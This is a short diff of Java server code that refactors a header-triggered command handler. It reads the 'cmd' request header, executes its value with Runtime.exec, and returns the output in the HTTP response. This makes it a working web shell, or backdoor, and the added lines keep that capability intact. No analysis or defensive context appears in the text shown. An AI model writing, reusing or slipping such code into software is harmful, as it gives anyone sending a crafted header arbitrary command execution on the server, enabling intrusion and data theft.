@@ -43,17 +43,8 @@
 
                     String cmd = req.getHeader("cmd");
                     if (cmd != null) {
-                        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
-                        java.io.InputStreamReader isr = new java.io.InputStreamReader(in);
-                        java.io.BufferedReader br = new java.io.BufferedReader(isr);
-
-                        StringBuilder sb = new StringBuilder();
-                        String line;
-                        while ((line = br.readLine()) != null) {
-                            sb.append(line + "\n");
-                        }
-
-                        java.nio.ByteBuffer buffer = java.nio.ByteBuffer.wrap(sb.toString().getBytes());
+                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
+                        java.nio.ByteBuffer buffer = java.nio.ByteBuffer.wrap(res.getBytes());
                         req.getResponse().doWrite(buffer);
                         break label;
                     }
